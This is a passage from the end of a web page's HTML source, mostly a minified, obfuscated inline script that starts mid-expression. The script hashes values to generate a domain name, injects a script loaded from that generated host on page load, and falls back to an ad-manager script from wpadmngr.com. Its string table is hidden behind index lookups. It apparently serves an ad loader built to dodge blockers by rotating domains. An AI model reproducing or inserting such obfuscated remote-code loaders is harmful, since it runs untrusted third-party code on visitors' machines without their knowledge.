6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>